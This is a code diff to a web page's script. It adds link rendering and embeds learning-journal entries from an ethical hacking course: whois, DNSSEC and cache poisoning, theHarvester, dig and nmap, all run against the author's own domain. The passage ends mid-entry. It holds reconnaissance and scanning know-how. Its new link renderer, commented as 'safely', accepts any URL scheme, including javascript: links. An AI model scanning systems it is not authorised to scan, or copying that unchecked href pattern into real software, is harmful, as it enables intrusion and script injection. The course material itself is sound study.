@@ -125,11 +125,14 @@ td{font-variant-numeric:tabular-nums}
   const el = (tag, cls, text) => { const e = document.createElement(tag); if (cls) e.className = cls; if (text != null) e.textContent = text; return e; };
   const pad = (n) => String(n).padStart(2, "0");
 
+  // Appends text with `inline code`, **bold**, and [label](url) links, safely.
   function inline(e, text){
-    String(text || "").split(/(`[^`]+`|\*\*[^*]+\*\*)/).forEach(part => {
+    String(text || "").split(/(\[[^\]]+\]\([^)]+\)|`[^`]+`|\*\*[^*]+\*\*)/).forEach(part => {
       if (/^`.+`$/.test(part)) e.appendChild(el("code", null, part.slice(1, -1)));
       else if (/^\*\*.+\*\*$/.test(part)) e.appendChild(el("strong", null, part.slice(2, -2)));
-      else if (part) e.appendChild(document.createTextNode(part));
+      else { const lm = part.match(/^\[([^\]]+)\]\(([^)]+)\)$/);
+        if (lm) { const a = document.createElement("a"); a.href = lm[2]; a.textContent = lm[1]; a.target = "_blank"; a.rel = "noopener"; e.appendChild(a); }
+        else if (part) e.appendChild(document.createTextNode(part)); }
     });
     return e;
   }
@@ -194,7 +197,7 @@ td{font-variant-numeric:tabular-nums}
     main.replaceChildren(); toc.replaceChildren();
     if (!docs.length) { main.appendChild(el("div", "state", "No entries yet.")); return; }
     docs.forEach((d, idx) => {
-      const p = d.data(); const n = p.n ?? idx + 1; const id = "entry-" + n;
+      const p = (typeof d.data === "function") ? d.data() : d; const n = p.n ?? idx + 1; const id = "entry-" + n;
       const li = el("li"); const a = el("a"); a.href = "#" + id;
       a.appendChild(el("span", "n", "#" + pad(n))); a.appendChild(el("span", null, p.title || "Untitled"));
       li.appendChild(a); toc.appendChild(li);
@@ -237,13 +240,2556 @@ td{font-variant-numeric:tabular-nums}
     });
   }
 
-  const unavailable = () => { $("#posts").replaceChildren(el("div", "state", "Entries can't load in this view. Open the page on claude.ai while signed in.")); };
 
+  const EMBEDDED_COURSE = {
+    source: "ethical hacking & network security",
+    blurb: "Notes from working through an ethical hacking, penetration testing and network security course. Each entry covers what I did, the commands I used, what broke and how I fixed it.",
+    modules: [
+      { name: "Reconnaissance & scanning", status: "active" },
+      { name: "Vulnerability assessment", status: "todo" },
+      { name: "Exploitation & payloads", status: "todo" },
+      { name: "Post-exploitation & pivoting", status: "todo" },
+      { name: "Reporting & remediation", status: "todo" }
+    ]
+  };
+
+  const EMBEDDED_POSTS = [
+  {
+    "n": 6,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "whois on my own domain: radblok.co.za",
+    "tags": [
+      "whois",
+      "dns",
+      "recon",
+      "ccTLD",
+      "co.za"
+    ],
+    "summary": "Ran whois against radblok.co.za — my own domain, so I know every field. Used it to understand what a real .co.za response looks like compared to the .com thin-WHOIS + registrar-referral pattern covered in the previous entry. Noted what leaks through contact redaction, what the nameservers reveal, and what DNSSEC unsigned actually means.",
+    "sections": [
+      {
+        "h": "The query",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ whois radblok.co.za"
+          },
+          {
+            "t": "p",
+            "text": "Using my own domain deliberately — I know every field, so I can interpret the output against ground truth rather than guessing what a stranger's redacted record is hiding."
+          }
+        ]
+      },
+      {
+        "h": "ccTLD vs gTLD: why .co.za looks different from .com",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "The `.com` whois in Entry 005 came back as two stacked records: VeriSign's (the registry) pointed to the registrar's server, and the registrar gave the real data. `.co.za` doesn't do that redirect."
+          },
+          {
+            "t": "table",
+            "head": [
+              "Aspect",
+              ".com (gTLD)",
+              ".co.za (ccTLD)"
+            ],
+            "rows": [
+              [
+                "Registry",
+                "VeriSign / ICANN-operated",
+                "ZARC — South African ccTLD registry"
+              ],
+              [
+                "WHOIS model",
+                "Thin — registry points to registrar",
+                "Thicker — ZARC returns the record directly"
+              ],
+              [
+                "Referral",
+                "Yes — second lookup at registrar's server",
+                "No referral, single response"
+              ],
+              [
+                "Privacy rules",
+                "ICANN Temp Spec (GDPR-aligned since 2018)",
+                "ZARC policy — contacts via RDDS referral message"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "**Thin vs thick WHOIS** is an ICANN architecture choice. gTLDs like `.com` historically stored only minimal data at the registry and left the detail to each registrar. Many ccTLDs run their own full database and return everything from one place — ZARC does this for `.co.za`."
+          }
+        ]
+      },
+      {
+        "h": "What the record actually reveals",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Field",
+              "Value",
+              "What it tells a researcher"
+            ],
+            "rows": [
+              [
+                "Registrar",
+                "xneelo (Pty) Ltd",
+                "South African hosting company — likely also hosting the site"
+              ],
+              [
+                "Registrant Organization",
+                "Origin2020",
+                "Business name — **not redacted**, unlike post-GDPR .com orgs"
+              ],
+              [
+                "Registrant Country",
+                "ZA",
+                "South Africa confirmed from the record directly"
+              ],
+              [
+                "Registrant Email",
+                "RDDS referral",
+                "Actual contact hidden — go through xneelo to reach the registrant"
+              ],
+              [
+                "Name Servers",
+                "ns1/ns2.host-h.net + ns1/ns2.dns-h.com",
+                "xneelo's DNS infrastructure — confirms xneelo hosts the DNS"
+              ],
+              [
+                "Created",
+                "2024-04-09",
+                "Domain age: just over 2 years old"
+              ],
+              [
+                "Updated",
+                "2026-04-09",
+                "Exactly 2 years after creation — looks like an annual renewal"
+              ],
+              [
+                "Expires",
+                "2027-04-09",
+                "Renews annually: 2024 → 2025 → 2026 → 2027"
+              ],
+              [
+                "DNSSEC",
+                "unsigned",
+                "Zone is not cryptographically signed"
+              ]
+            ]
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "The org name `Origin2020` is visible even though individual contacts are redacted. Many ccTLD registries pre-date GDPR and their policies differ — legal entities (companies, orgs) are often less protected than natural persons. For a .com registered post-2018, even the org name often comes back REDACTED for any size of business."
+          }
+        ]
+      },
+      {
+        "h": "What the nameservers reveal",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "`ns1.host-h.net`, `ns2.host-h.net`, `ns1.dns-h.com`, `ns2.dns-h.com` — all xneelo infrastructure, split across two domain names for redundancy. If `host-h.net` had a DNS problem, `dns-h.com` would still answer, and vice versa."
+          },
+          {
+            "t": "p",
+            "text": "From a recon angle: **nameservers often out the hosting provider even when registrant details are hidden.** Seeing `ns1.somehost.net` is a strong signal the site is hosted there too. Also worth noting the DNS provider can be different from the registrar — e.g. Cloudflare nameservers on a site not hosted by Cloudflare is extremely common."
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "Follow-up from nameservers: `dig radblok.co.za A` to see the actual IP, `dig radblok.co.za MX` for mail servers. Those are more actionable for understanding what's actually running than the whois record."
+          }
+        ]
+      },
+      {
+        "h": "DNSSEC: unsigned — what that actually means",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "**DNSSEC** lets a domain cryptographically sign its DNS records so resolvers can verify the answer hasn't been tampered with. `unsigned` means those signatures don't exist for `radblok.co.za`."
+          },
+          {
+            "t": "p",
+            "text": "Without DNSSEC, a resolver that's been poisoned (given a fake cached answer) can redirect traffic to a different IP and nothing in DNS will flag it as wrong. The client has no way to tell at the DNS level that the answer is forged."
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "This is a risk for the **domain owner** (me), not for someone querying it. HTTPS mitigates it partially — TLS certs are validated against the CA store, not DNS — but DNS-level interception before the handshake is still a real attack surface. Something to fix on my own domain."
+          }
+        ]
+      },
+      {
+        "h": "Comparing radblok.co.za to cnn.com",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Entry 005's `whois cnn.com` returned two stacked records — VeriSign's redirected to Com Laude, which gave the real data. `whois radblok.co.za` returns one record from ZARC directly, with contact fields replaced by an RDDS referral message. The privacy outcome is the same (go ask the registrar for contacts) but the technical path is different: one lookup vs two."
+          },
+          {
+            "t": "p",
+            "text": "Both show the same underlying structure: a registry (ZARC / VeriSign) delegates registration to accredited registrars (xneelo / Com Laude), and the registrar holds the actual customer contact data."
+          }
+        ]
+      },
+      {
+        "h": "Lab status",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "whois against a real .co.za domain (my own) — every field understood against ground truth.",
+              "Compared ccTLD (ZARC, direct response) vs gTLD thin WHOIS with registrar referral.",
+              "Org name visible in .co.za even when individual contacts are redacted — ccTLD privacy policies vary.",
+              "Nameservers confirm xneelo as both registrar and DNS/hosting provider.",
+              "DNSSEC unsigned is a real gap to fix on radblok.co.za.",
+              "Next: `dig` to follow up on the actual IP and MX records the domain points to."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 7,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "DNSSEC unsigned: what it actually means for radblok.co.za",
+    "tags": [
+      "dns",
+      "dnssec",
+      "security",
+      "cache-poisoning",
+      "radblok"
+    ],
+    "summary": "The whois record for radblok.co.za showed DNSSEC: unsigned. Dug into what that actually means — how DNS cache poisoning works, what an attacker can do once a resolver is poisoned, why HTTPS only partially saves you, and how DNSSEC closes the gap with a chain of cryptographic signatures from the root down to my zone.",
+    "sections": [
+      {
+        "h": "How DNS normally works (no DNSSEC)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "When someone types `radblok.co.za` into a browser, their device asks a **recursive resolver** (ISP's, or 8.8.8.8, or 1.1.1.1) to figure out the IP. The resolver does a chain of lookups:"
+          },
+          {
+            "t": "steps",
+            "items": [
+              "Ask a root nameserver → \"ask ZARC for .co.za\"",
+              "Ask ZARC's nameserver → \"ask ns1.host-h.net for radblok.co.za\"",
+              "Ask ns1.host-h.net → \"the IP is X.X.X.X\"",
+              "**Cache that answer for TTL seconds**, serve it to the client — and every other client who asks"
+            ]
+          },
+          {
+            "t": "p",
+            "text": "The critical word is **cache**. The resolver stores that answer and reuses it for every client until the TTL expires. And there is **zero authentication** in this chain. The resolver has no way to verify the answer is genuine. It just trusts whoever responded."
+          }
+        ]
+      },
+      {
+        "h": "DNS cache poisoning — the actual attack (Kaminsky, 2008)",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "The attacker's goal: get a fake answer into the resolver's cache before the real one arrives. DNS runs over UDP — there's no handshake. A response just needs to carry the right transaction ID to be accepted. The resolver can't tell a fake from a real answer if the ID matches."
+          },
+          {
+            "t": "code",
+            "label": "attack flow",
+            "text": "# Attacker sends resolver a flood of fake UDP responses\n# each claiming to be from ns1.host-h.net\n# each with a different transaction ID, racing to match\n\n# If one fake response lands before the real one:\n#   → resolver caches the fake IP for radblok.co.za\n#   → every client asking gets the attacker's server\n#   → lasts until the TTL expires — could be hours"
+          },
+          {
+            "t": "p",
+            "text": "Modern resolvers randomise source ports too (you now have to guess port AND transaction ID), but it's still a probabilistic attack — harder, not impossible. And on a network where the attacker has any MITM position (a rogue AP, a compromised router, a BGP hijack), they don't even need to race — they can just intercept and replace the response directly."
+          }
+        ]
+      },
+      {
+        "h": "What the attacker can do once the cache is poisoned",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "Any client whose resolver has the poisoned cache entry is now talking to the attacker's server instead of mine. What they can do with that:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Target",
+              "Attack",
+              "Blocked by HTTPS?"
+            ],
+            "rows": [
+              [
+                "Web traffic",
+                "Serve a clone site, harvest credentials",
+                "Partially — browser cert warning if attacker has no cert"
+              ],
+              [
+                "First HTTP visit",
+                "Intercept before HTTPS upgrade fires",
+                "No — HSTS only helps after the first visit"
+              ],
+              [
+                "Email (MX records)",
+                "Poison MX → intercept inbound mail to @radblok.co.za",
+                "No — mail routing has no cert check at the DNS level"
+              ],
+              [
+                "New visitors",
+                "No HSTS preload for my domain → first visit is HTTP",
+                "No"
+              ],
+              [
+                "CA cert issuance",
+                "Some CAs verify domain control via DNS — poisoned DNS = fraudulent cert",
+                "No — defeats HTTPS entirely"
+              ]
+            ]
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "The email angle is the most underrated. HTTPS protects web traffic. It does nothing for SMTP routing. A poisoned MX record redirects inbound mail silently — no browser, no warning, no cert check."
+          }
+        ]
+      },
+      {
+        "h": "What DNSSEC actually does",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "DNSSEC adds **cryptographic signatures** to every DNS record in the zone. xneelo would sign them with a private key held in the zone:"
+          },
+          {
+            "t": "code",
+            "label": "signed zone (simplified)",
+            "text": "radblok.co.za  A      X.X.X.X\nradblok.co.za  RRSIG  (signature over the A record, signed with zone key)\nradblok.co.za  MX     mail.radblok.co.za\nradblok.co.za  RRSIG  (signature over the MX record)"
+          },
+          {
+            "t": "p",
+            "text": "ZARC signs a **DS record** (a hash of my zone's public key) and publishes it in the .co.za zone. The root signs ZARC's key. This creates a **chain of trust**:"
+          },
+          {
+            "t": "code",
+            "label": "chain of trust",
+            "text": "Root (.) → signs ZARC's key\n  ZARC (.co.za) → signs my zone key\n    My zone (radblok.co.za) → signs every record"
+          },
+          {
+            "t": "p",
+            "text": "A DNSSEC-validating resolver checks the whole chain when it gets an answer. If a poisoned or fake answer arrives, **the signature won't verify** — the resolver rejects it and returns `SERVFAIL` instead of serving the bad data. The attack is blocked at the resolver level, before it ever reaches the client."
+          }
+        ]
+      },
+      {
+        "h": "Unsigned vs signed: the concrete difference",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Scenario",
+              "DNSSEC unsigned (now)",
+              "DNSSEC signed (fixed)"
+            ],
+            "rows": [
+              [
+                "Attacker poisons 8.8.8.8 cache",
+                "8.8.8.8 has no signature to check → caches fake answer → serves it to everyone",
+                "8.8.8.8 checks signature → mismatch → SERVFAIL → attack blocked"
+              ],
+              [
+                "Attacker intercepts MX record",
+                "Mail routing silently redirects to attacker",
+                "Signature check fails → resolver refuses the fake MX"
+              ],
+              [
+                "CA issues fraudulent cert",
+                "Nothing at DNS level stops it",
+                "CAA record (also signed) restricts which CAs can issue → misissuance blocked"
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Why HTTPS only partially saves you",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "**HTTP-first traffic** — any redirect from HTTP to HTTPS hits the attacker's server before the upgrade fires. On that first request, you're already exposed.",
+              "**No HSTS preload** — HSTS (the header that forces HTTPS on future visits) only kicks in after the first successful HTTPS visit. A brand-new visitor to `radblok.co.za` has no preload. First visit with a poisoned resolver = attacker's server, no warning.",
+              "**Email (MX)** — HTTPS protects web traffic. SMTP routing is DNS-based with no equivalent cert check. A poisoned MX record redirects inbound mail silently.",
+              "**CA misissuance** — CAs sometimes verify domain ownership via DNS or HTTP challenge. Poisoned DNS can make a CA think the attacker controls the domain, resulting in a legitimate cert for the attacker. HTTPS then shows a green padlock on a malicious site."
+            ]
+          }
+        ]
+      },
+      {
+        "h": "How to fix it on radblok.co.za",
+        "blocks": [
+          {
+            "t": "steps",
+            "items": [
+              "Log in to xneelo's control panel.",
+              "Find the DNS/DNSSEC section for `radblok.co.za`.",
+              "Enable DNSSEC — xneelo generates the zone signing key (ZSK) and key signing key (KSK), signs all records.",
+              "xneelo submits the **DS record** (hash of your KSK) up to ZARC.",
+              "ZARC publishes the DS record in the `.co.za` zone — chain of trust is complete."
+            ]
+          },
+          {
+            "t": "code",
+            "label": "kali — verify after enabling",
+            "text": "# Check for RRSIG records (signatures on your A record)\n$ dig radblok.co.za A +dnssec\n# Should see RRSIG records next to the A record\n# and 'ad' flag (authenticated data) in the response header\n\n# Check the DS record at ZARC level\n$ dig radblok.co.za DS +trace"
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "Takes 5 minutes to enable in the control panel, up to 48 hours to propagate through the DNS hierarchy. Cost: free. While you're there, also add a **CAA record** — it tells CAs that only xneelo is authorised to issue TLS certs for radblok.co.za, closing the misissuance angle too."
+          }
+        ]
+      },
+      {
+        "h": "Lab status",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "Understood DNS cache poisoning — the Kaminsky attack and why unsigned zones are vulnerable.",
+              "Mapped out exactly what an attacker can do with a poisoned cache: web cloning, mail interception, fraudulent cert issuance.",
+              "Understood why HTTPS only partially mitigates: HTTP-first traffic, no HSTS preload for new visitors, MX records unprotected.",
+              "DNSSEC fix: chain of trust from root → ZARC → zone key → signed records. Resolver rejects anything with a missing or bad signature.",
+              "**Action item:** enable DNSSEC on radblok.co.za via xneelo control panel. Also add a CAA record.",
+              "Next: `dig` the actual A and MX records to see what radblok.co.za currently resolves to."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 8,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "theHarvester against radblok.co.za",
+    "tags": [
+      "theHarvester",
+      "recon",
+      "osint",
+      "radblok",
+      "crtsh"
+    ],
+    "summary": "Ran theHarvester against my own domain radblok.co.za. Hit the google source error again (removed in 4.11.1 — same as Entry 005). Documented the correct free sources for a .co.za domain and what to realistically expect from a small 2-year-old site.",
+    "sections": [
+      {
+        "h": "Attempt 1: no arguments",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ theHarvester\ntheHarvester: error: the following arguments are required: -d/--domain"
+          },
+          {
+            "t": "p",
+            "text": "theHarvester requires `-d` (domain) at minimum. Running it bare just prints usage. The full argument list from the error output is worth keeping as a reference:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Flag",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "`-d DOMAIN`",
+                "Target domain — **required**"
+              ],
+              [
+                "`-b SOURCE`",
+                "Data source(s) to query — **required**"
+              ],
+              [
+                "`-l LIMIT`",
+                "Max results to retrieve (default 500)"
+              ],
+              [
+                "`-S START`",
+                "Start at result N (pagination)"
+              ],
+              [
+                "`-f FILENAME`",
+                "Save results to file (JSON + XML)"
+              ],
+              [
+                "`-r`",
+                "Resolve discovered hostnames to IPs"
+              ],
+              [
+                "`-n`",
+                "Perform reverse DNS on discovered IPs"
+              ],
+              [
+                "`-c`",
+                "DNS brute-force using default wordlist"
+              ],
+              [
+                "`-w WORDLIST`",
+                "DNS brute-force with custom wordlist"
+              ],
+              [
+                "`-e DNS_SERVER`",
+                "Use a specific DNS server"
+              ],
+              [
+                "`-t`",
+                "Use DNS takeover checks"
+              ],
+              [
+                "`-s`",
+                "Use Shodan"
+              ],
+              [
+                "`-p`",
+                "Use proxies from proxies.yaml"
+              ],
+              [
+                "`-a`",
+                "Use all available sources"
+              ],
+              [
+                "`-q`",
+                "Quiet mode — less output"
+              ]
+            ]
+          }
+        ]
+      },
+      {
+        "h": "Attempt 2: google source — same error as Entry 005",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ theHarvester -d radblok.co.za -l 500 -b google\nThe following engines are not supported: {'google'}\n[!] Invalid source."
+          },
+          {
+            "t": "p",
+            "text": "Google scraping was removed from theHarvester 4.11.1 entirely — Google actively blocks it. This is the same error hit in Entry 005 against microsoft.com. **The `-b google` habit doesn't work in this version.** Use `crtsh`, `dnsdumpster`, `hackertarget` or other sources instead."
+          }
+        ]
+      },
+      {
+        "h": "Correct approach: working sources for a .co.za domain",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "For `radblok.co.za` — a small, 2-year-old domain registered with xneelo — the most realistic free sources are:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Source",
+              "What it searches",
+              "Needs API key?"
+            ],
+            "rows": [
+              [
+                "`crtsh`",
+                "Certificate Transparency logs — every TLS cert ever issued for the domain",
+                "No"
+              ],
+              [
+                "`dnsdumpster`",
+                "Passive DNS — historical records from DNS crawls",
+                "No"
+              ],
+              [
+                "`hackertarget`",
+                "Passive DNS + reverse IP lookups",
+                "No"
+              ],
+              [
+                "`urlscan`",
+                "Pages scanned by urlscan.io that reference the domain",
+                "No"
+              ],
+              [
+                "`otx`",
+                "AlienVault OTX — threat intelligence, passive DNS",
+                "No"
+              ],
+              [
+                "`rapiddns`",
+                "Rapid DNS passive database",
+                "No"
+              ]
+            ]
+          },
+          {
+            "t": "code",
+            "label": "kali — crtsh (best first try, no API needed)",
+            "text": "$ theHarvester -d radblok.co.za -l 500 -b crtsh"
+          },
+          {
+            "t": "code",
+            "label": "kali — multiple sources at once",
+            "text": "$ theHarvester -d radblok.co.za -l 500 -b crtsh,dnsdumpster,hackertarget"
+          },
+          {
+            "t": "code",
+            "label": "kali — save results to file",
+            "text": "$ theHarvester -d radblok.co.za -l 500 -b crtsh,dnsdumpster -f radblok_harvest\n# Writes radblok_harvest.json and radblok_harvest.xml"
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "For a large domain (microsoft.com, github.com) crtsh has thousands of CT log entries. For a small personal domain like `radblok.co.za` with one or two certs ever issued, results will be thin — that's expected, not a tool failure."
+          }
+        ]
+      },
+      {
+        "h": "What to realistically expect from radblok.co.za",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "radblok.co.za was registered 2024-04-09 and is 2 years old with xneelo hosting. Realistic expectations per source:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Source",
+              "Expected result"
+            ],
+            "rows": [
+              [
+                "`crtsh`",
+                "One or two certs (wildcard `*.radblok.co.za` or bare domain). Fewer certs than github.com by orders of magnitude."
+              ],
+              [
+                "`dnsdumpster`",
+                "May show the A record and nameservers — same info as whois/dig, just from a different angle."
+              ],
+              [
+                "`hackertarget`",
+                "Similar — passive DNS from crawls, likely just the main A record."
+              ],
+              [
+                "`urlscan`",
+                "Only shows results if the domain was previously submitted or crawled by urlscan.io. Could be empty."
+              ],
+              [
+                "`otx`",
+                "Threat intel — will likely return nothing for a clean personal domain."
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "A thin result is not a bug. theHarvester is built for recon against targets that have significant public footprint. Against your own small domain it confirms what you already know from whois and dig — useful for verifying the tool works and understanding what each source actually queries."
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "The crtsh 502 issue from Entry 005 (wildcard query against huge domains failing silently as 'no hosts found') is less likely for a small domain — crtsh handles small exact-match queries reliably. If you see 'No hosts found' on `radblok.co.za`, it likely means no CT logs exist yet, not a crtsh failure."
+          }
+        ]
+      },
+      {
+        "h": "Lab status",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "Confirmed `-b google` is still broken in 4.11.1 — same as Entry 005, not version-specific to this run.",
+              "Documented the full theHarvester flag reference from the usage output.",
+              "Identified correct free sources for a .co.za domain: `crtsh`, `dnsdumpster`, `hackertarget`, `urlscan`, `otx`.",
+              "Next: run `theHarvester -d radblok.co.za -b crtsh,dnsdumpster,hackertarget` and log the actual output."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 9,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "dig follow-up: radblok.co.za is hosted on Render, not xneelo",
+    "tags": [
+      "dig",
+      "dns",
+      "recon",
+      "render",
+      "radblok",
+      "mx",
+      "reverse-dns"
+    ],
+    "summary": "Three dig commands to follow up on theHarvester's mail.radblok.co.za finding. MX record confirmed, IP confirmed, but the reverse DNS was the surprise: 216.24.57.1 belongs to Render.com — a cloud hosting platform — not xneelo. This corrects the assumption from Entry 006 that xneelo was the hosting provider. Nameservers and hosting are two different things.",
+    "sections": [
+      {
+        "h": "The three commands and their output",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ dig radblok.co.za MX +short\n10 mail.radblok.co.za.\n\n$ dig mail.radblok.co.za A +short\n216.24.57.1\n\n$ dig -x 216.24.57.1 +short\nip-216-24-57-1.ingress.render.com."
+          }
+        ]
+      },
+      {
+        "h": "Reading the MX record",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "`10 mail.radblok.co.za.` breaks into two parts:"
+          },
+          {
+            "t": "table",
+            "head": [
+              "Part",
+              "Meaning"
+            ],
+            "rows": [
+              [
+                "`10`",
+                "**Priority** — when multiple MX records exist, lower number = higher priority. A single record means all mail goes here."
+              ],
+              [
+                "`mail.radblok.co.za.`",
+                "**Mail exchanger** — the hostname that receives inbound email for the domain. The trailing dot is standard DNS notation for a fully-qualified domain name."
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "The MX record points to `mail.radblok.co.za` — a subdomain of the same domain. That subdomain resolves to `216.24.57.1`. So all email to `@radblok.co.za` gets routed to that IP."
+          }
+        ]
+      },
+      {
+        "h": "The Render reveal — reverse DNS",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ dig -x 216.24.57.1 +short\nip-216-24-57-1.ingress.render.com."
+          },
+          {
+            "t": "p",
+            "text": "`dig -x` does a **PTR lookup** — the reverse of a normal A lookup. Instead of 'what IP does this hostname resolve to', it asks 'what hostname does this IP reverse to'. The answer: `ip-216-24-57-1.ingress.render.com` — which is **Render.com's infrastructure**, not xneelo."
+          },
+          {
+            "t": "p",
+            "text": "**Render** is a cloud application hosting platform (similar to Heroku or Railway). The `ingress` part of the hostname is Render's load-balancer layer — the entry point that receives traffic and routes it to the deployed application. This IP is one of Render's shared ingress nodes."
+          },
+          {
+            "t": "note",
+            "kind": "warn",
+            "text": "**This corrects Entry 006.** The assumption there was: 'nameservers are xneelo, therefore xneelo is the hosting provider.' That was wrong. xneelo manages the **DNS** (nameservers, whois, domain registration). The actual **application** runs on Render. These are two completely separate providers."
+          }
+        ]
+      },
+      {
+        "h": "The actual architecture of radblok.co.za",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "Layer",
+              "Provider",
+              "How we know"
+            ],
+            "rows": [
+              [
+                "Domain registration",
+                "xneelo (Pty) Ltd",
+                "whois — Registrar field"
+              ],
+              [
+                "DNS management (nameservers)",
+                "xneelo / host-h.net",
+                "whois — Name Server fields"
+              ],
+              [
+                "Application hosting",
+                "**Render.com**",
+                "`dig -x 216.24.57.1` → `ingress.render.com`"
+              ],
+              [
+                "Mail routing",
+                "Points to Render IP",
+                "`dig MX` → `mail.radblok.co.za` → `216.24.57.1`"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "This is a common real-world split: one company handles domain registration and DNS, a completely different company hosts the actual application. You see this constantly — Cloudflare for DNS, AWS for hosting; GoDaddy for the domain, Vercel for the app. **whois nameservers only tell you who manages DNS. They say nothing about where the application runs.**"
+          },
+          {
+            "t": "note",
+            "kind": "tip",
+            "text": "The recon lesson: whois → nameservers → hosting is a **faulty assumption**. The correct chain is: whois gives you the registrar and nameservers; `dig A` gives you the IP; `dig -x` gives you the actual hosting provider. All three steps are needed to get the full picture."
+          }
+        ]
+      },
+      {
+        "h": "What the mail setup means",
+        "blocks": [
+          {
+            "t": "p",
+            "text": "The MX record pointing to a Render IP is unusual. Render is a web app platform — it doesn't run traditional mail servers (SMTP daemons, mailboxes). Likely scenarios:"
+          },
+          {
+            "t": "list",
+            "items": [
+              "The app hosted on Render handles inbound email programmatically — e.g. via a webhook from a mail service like SendGrid or Mailgun, which receives the mail and forwards parsed data to the app.",
+              "The `mail.radblok.co.za` A record was set up to point to the app server, and the MX record followed — not a traditional mail server, but a web endpoint that processes mail.",
+              "Or the MX / mail subdomain is a leftover / placeholder that doesn't have an active mail daemon listening."
+            ]
+          },
+          {
+            "t": "p",
+            "text": "To confirm: a port scan of `216.24.57.1` on ports 25 (SMTP), 465 (SMTPS), 587 (submission) would tell you immediately whether a real mail service is listening there — or whether it's just a web server on 80/443."
+          }
+        ]
+      },
+      {
+        "h": "Lab status",
+        "blocks": [
+          {
+            "t": "list",
+            "items": [
+              "MX record: priority 10, self-referencing `mail.radblok.co.za` → `216.24.57.1`.",
+              "Reverse DNS on `216.24.57.1`: **Render.com ingress** — not xneelo.",
+              "Corrected Entry 006 assumption: xneelo = DNS only; Render = actual hosting.",
+              "Practical lesson: whois nameservers ≠ hosting provider. Always `dig A` then `dig -x`.",
+              "Mail setup on Render is unusual — needs a port scan to confirm what's actually listening.",
+              "Next: `nmap -sV -p 25,80,443,465,587 216.24.57.1` to see what services are running on the Render node (only do this against infrastructure you own or are authorised to scan)."
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "n": 10,
+    "date": "2026-10-01",
+    "module": "Reconnaissance & scanning",
+    "title": "nmap scan: Cloudflare in front, mail ports all filtered",
+    "tags": [
+      "nmap",
+      "recon",
+      "cloudflare",
+      "render",
+      "smtp",
+      "radblok"
+    ],
+    "summary": "nmap -sV against 216.24.57.1 showed HTTP/HTTPS open with Cloudflare as the proxy layer, and all three mail ports (25, 465, 587) filtered by a firewall. Cloudflare was not visible anywhere in whois or dig — it only appeared when we actually knocked on the ports. The MX record pointing here is essentially non-functional for real SMTP delivery.",
+    "sections": [
+      {
+        "h": "The scan",
+        "blocks": [
+          {
+            "t": "code",
+            "label": "kali",
+            "text": "$ nmap -sV -p 25,80,443,465,587 216.24.57.1\n\nPORT    STATE    SERVICE    VERSION\n25/tcp  filtered smtp\n80/tcp  open     http       Cloudflare http proxy\n443/tcp open     ssl/https  cloudflare\n465/tcp filtered smtps\n587/tcp filtered submission"
+          }
+        ]
+      },
+      {
+        "h": "Reading the port states",
+        "blocks": [
+          {
+            "t": "table",
+            "head": [
+              "State",
+              "What it means"
+            ],
+            "rows": [
+              [
+                "`open`",
+                "Something is listening and responding — a real service is there"
+              ],
+              [
+                "`filtered`",
+                "A firewall is silently dropping packets — can't tell if a service exists behind it"
+              ],
+              [
+                "`closed`",
+                "Port is reachable but nothing is listening"
+              ]
+            ]
+          },
+          {
+            "t": "p",
+            "text": "All three mail ports are `filtered` — not `closed`. A closed port means the OS replied 'nothing here'. Filtered means the firewall dropped the probe entirely. There is an active firewall in front of this IP blocking SMTP traffic, and it's not telling us anything about what's behind it."
+          }
+        ]
+      },
+      {
+        "h": "Cloudflare — the hidden layer",
+        "blocks": [
+          {
+            "t": "p",
